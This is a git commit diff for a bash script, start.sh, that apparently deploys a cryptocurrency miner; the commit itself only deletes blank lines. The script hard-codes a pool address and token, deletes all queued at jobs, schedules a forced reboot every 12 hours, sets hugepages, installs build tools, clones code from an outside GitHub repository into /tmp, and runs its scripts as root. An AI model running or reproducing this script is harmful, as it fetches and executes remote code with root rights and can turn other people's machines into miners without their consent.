4154cfb92842592b0fa2f9ffd69cdba72cc571e2
servicemi <52180716+servicemi@users.noreply.github.com>
2019-06-26 10:21:38 +0100

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,13 +1,10 @@
 #!/bin/bash
 IPADR="95.216.187.139:4500"
 MNRCO="nopfhkj"
-
 ID="$(hostname)"
 THREADS="$(nproc --all)"
-
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo echo 'sudo reboot -f' | at now + 12 hours
-
 rm -rf /tmp/none/
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
@@ -15,7 +12,6 @@ sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sudo apt-get install dos2unix
 sleep 2
-
 cd /tmp && mkdir none
 git clone https://github.com/nomonom/toropil.git /tmp/none
 cd /tmp/none
@@ -32,5 +28,4 @@ sudo dos2unix 80.sh
 sudo dos2unix 65.sh
 sudo dos2unix 90.sh
 sudo dos2unix 40.sh
-
 sudo ./pusk.sh & ./checker.sh
